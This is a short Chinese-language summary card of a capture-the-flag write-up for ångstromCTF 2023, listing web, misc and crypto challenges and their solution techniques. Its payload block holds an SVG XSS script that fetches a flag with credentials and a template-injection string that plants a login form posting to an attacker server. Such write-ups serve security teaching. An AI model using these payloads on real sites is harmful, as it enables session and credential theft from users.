---
title: "ångstromCTF 2023 WP"
category: web
tags: ["ångstromCTF", "web", "js-swap-reverse", "directory-traversal", "SVG-XSS", "jinja2-SSTI"]
signals: ["ångstromCTF 2023", "js-swap-reverse", "directory-traversal", "SVG-XSS", "jinja2-SSTI", "host-header", "http-smuggling", "AES-CBC", "cookie-tampering", "ssti", "ngstromCTF", "Web", "Jinja2", "SSTI"]
difficulty: medium
source: "https://www.ctfiot.com/112826.html"
tools: ["Jinja2", "Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# ångstromCTF 2023 WP

> 赛事：ångstromCTF 2023 | 方向：web | 难度：medium | 工具：Jinja2、Python

## 一句话总结

ångstromCTF 2023 综合 WP，覆盖 Web 入门到 Jinja2 SSTI 提权、Misc 文件还原、Crypto RSA/LFSR/坐标下降等多个领域。

## 攻击链

1. WEB 类：catch me if you can 抓包 flag/shortcircuit 反写 swap3/directory 1-5000 遍历 id/hallmark SVG XSS type[]=image/svg+xml/brokenlogin jinja2 SSTI 25字节限制+request.args|safe 绕 escape/Celeste Speedrunning 时间戳溢出/Celeste Tunneling Host: flag.local/MISC 类：Pusheen.txt zip base64 反解/Extremely Safe Vault 65537 RSA + 65535 e 二项式/Simple Storage Program 翻转位+对称差/Catch me if you can PAC 替换/CRYPTO 类：BB prng 爆破/Coordinate Descent 8 维 step down 找解

## 关键 payload

```
hallmark.svg = <svg><script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;...;xmlhttp.open('GET','https://hallmark.web.actf.co/flag',true);xmlhttp.send();</script></svg>  brokenlogin ?message={{request.args|safe}}&r=<form action=http://vps/ method=POST>...</form><!--
```

## 经验教训

SVG XSS 需 url 编码；Jinja2 `render_template_string(page, fails=fails)` 中 `fails` 用户可控可注入；Host 头走私走 SECRETSITE 比对；Python zipfile 还原 base64 串；AES-CBC 字节翻转需改前一密文块对应字节。

## 标签

js-swap-reverse、directory-traversal、SVG-XSS、jinja2-SSTI、host-header、http-smuggling、AES-CBC、cookie-tampering、race-condition、bch-code

## 参考来源

- https://www.ctfiot.com/112826.html
- 原文件：ångstromCTF_2023_WP.full.md
